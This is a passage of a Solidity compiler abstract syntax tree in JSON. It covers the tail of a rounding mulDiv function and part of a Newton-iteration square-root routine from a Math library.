tring":"function (uint256,uint256,uint256) pure returns (uint256)"}},"id":1956,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5899:25:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"5882:42:10"},{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1969,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"id":1961,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1958,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1945,"src":"5938:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":1959,"name":"Rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1729,"src":"5950:8:10","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_Rounding_$1729_$","typeString":"type(enum Math.Rounding)"}},"id":1960,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"Up","nodeType":"MemberAccess","referencedDeclaration":1727,"src":"5950:11:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"src":"5938:23:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1968,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1963,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1938,"src":"5972:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1964,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1940,"src":"5975:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1965,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1942,"src":"5978:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1962,"name":"mulmod","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-16,"src":"5965:6:10","typeDescriptions":{"typeIdentifier":"t_function_mulmod_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint256) pure returns (uint256)"}},"id":1966,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5965:25:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1967,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5993:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"5965:29:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"5938:56:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1975,"nodeType":"IfStatement","src":"5934:98:10","trueBody":{"id":1974,"nodeType":"Block","src":"5996:36:10","statements":[{"expression":{"id":1972,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1970,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1951,"src":"6010:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":1971,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6020:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"6010:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1973,"nodeType":"ExpressionStatement","src":"6010:11:10"}]}},{"expression":{"id":1976,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1951,"src":"6048:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1949,"id":1977,"nodeType":"Return","src":"6041:13:10"}]},"documentation":{"id":1936,"nodeType":"StructuredDocumentation","src":"5598:121:10","text":" @notice Calculates x * y / denominator with full precision, following the selected rounding direction."},"id":1979,"implemented":true,"kind":"function","modifiers":[],"name":"mulDiv","nameLocation":"5733:6:10","nodeType":"FunctionDefinition","parameters":{"id":1946,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1938,"mutability":"mutable","name":"x","nameLocation":"5757:1:10","nodeType":"VariableDeclaration","scope":1979,"src":"5749:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1937,"name":"uint256","nodeType":"ElementaryTypeName","src":"5749:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1940,"mutability":"mutable","name":"y","nameLocation":"5776:1:10","nodeType":"VariableDeclaration","scope":1979,"src":"5768:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1939,"name":"uint256","nodeType":"ElementaryTypeName","src":"5768:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1942,"mutability":"mutable","name":"denominator","nameLocation":"5795:11:10","nodeType":"VariableDeclaration","scope":1979,"src":"5787:19:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1941,"name":"uint256","nodeType":"ElementaryTypeName","src":"5787:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1945,"mutability":"mutable","name":"rounding","nameLocation":"5825:8:10","nodeType":"VariableDeclaration","scope":1979,"src":"5816:17:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"},"typeName":{"id":1944,"nodeType":"UserDefinedTypeName","pathNode":{"id":1943,"name":"Rounding","nodeType":"IdentifierPath","referencedDeclaration":1729,"src":"5816:8:10"},"referencedDeclaration":1729,"src":"5816:8:10","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$1729","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"5739:100:10"},"returnParameters":{"id":1949,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1948,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1979,"src":"5863:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1947,"name":"uint256","nodeType":"ElementaryTypeName","src":"5863:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5862:9:10"},"scope":2587,"src":"5724:337:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2090,"nodeType":"Block","src":"6337:1585:10","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1989,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1987,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"6351:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1988,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6356:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"6351:6:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1993,"nodeType":"IfStatement","src":"6347:45:10","trueBody":{"id":1992,"nodeType":"Block","src":"6359:33:10","statements":[{"expression":{"hexValue":"30","id":1990,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6380:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"functionReturnParameters":1986,"id":1991,"nodeType":"Return","src":"6373:8:10"}]}},{"assignments":[1995],"declarations":[{"constant":false,"id":1995,"mutability":"mutable","name":"result","nameLocation":"7079:6:10","nodeType":"VariableDeclaration","scope":2090,"src":"7071:14:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1994,"name":"uint256","nodeType":"ElementaryTypeName","src":"7071:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2004,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2003,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":1996,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7088:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2001,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1998,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7099:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1997,"name":"log2","nodeType":"Identifier","overloadedDeclarations":[2259,2295],"referencedDeclaration":2259,"src":"7094:4:10","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":1999,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7094:7:10","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2000,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7105:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7094:12:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2002,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7093:14:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7088:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"7071:36:10"},{"id":2089,"nodeType":"UncheckedBlock","src":"7508:408:10","statements":[{"expression":{"id":2014,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2005,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7532:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2013,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2010,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2006,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7542:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2009,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2007,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7551:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2008,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7555:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7551:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7542:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2011,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7541:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2012,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7566:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7541:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7532:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2015,"nodeType":"ExpressionStatement","src":"7532:35:10"},{"expression":{"id":2025,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2016,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7581:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2024,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2021,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2017,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7591:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2020,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2018,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7600:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2019,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7604:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7600:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7591:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2022,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7590:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2023,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7615:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7590:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7581:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2026,"nodeType":"ExpressionStatement","src":"7581:35:10"},{"expression":{"id":2036,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2027,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7630:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2035,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2032,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2028,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7640:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2031,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2029,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7649:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2030,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7653:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7649:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7640:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2033,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7639:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2034,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7664:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7639:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7630:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2037,"nodeType":"ExpressionStatement","src":"7630:35:10"},{"expression":{"id":2047,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2038,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7679:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2046,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2043,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2039,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7689:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2042,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2040,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7698:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2041,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7702:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7698:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7689:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2044,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7688:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2045,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7713:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7688:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7679:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2048,"nodeType":"ExpressionStatement","src":"7679:35:10"},{"expression":{"id":2058,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2049,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7728:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2057,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2054,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2050,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7738:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2053,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2051,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7747:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2052,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7751:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7747:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7738:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2055,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7737:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2056,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7762:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7737:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7728:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2059,"nodeType":"ExpressionStatement","src":"7728:35:10"},{"expression":{"id":2069,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2060,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7777:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2068,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2065,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2061,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7787:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2064,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2062,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7796:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2063,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7800:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7796:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7787:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2066,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7786:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2067,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7811:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7786:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7777:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2070,"nodeType":"ExpressionStatement","src":"7777:35:10"},{"expression":{"id":2080,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2071,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7826:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2079,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2076,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2072,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7836:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2075,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2073,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7845:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2074,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7849:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7845:10:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7836:19:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2077,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7835:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":2078,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7860:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"7835:26:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7826:35:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2081,"nodeType":"ExpressionStatement","src":"7826:35:10"},{"expression":{"arguments":[{"id":2083,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7886:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2086,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2084,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1982,"src":"7894:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":2085,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1995,"src":"7898:6:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString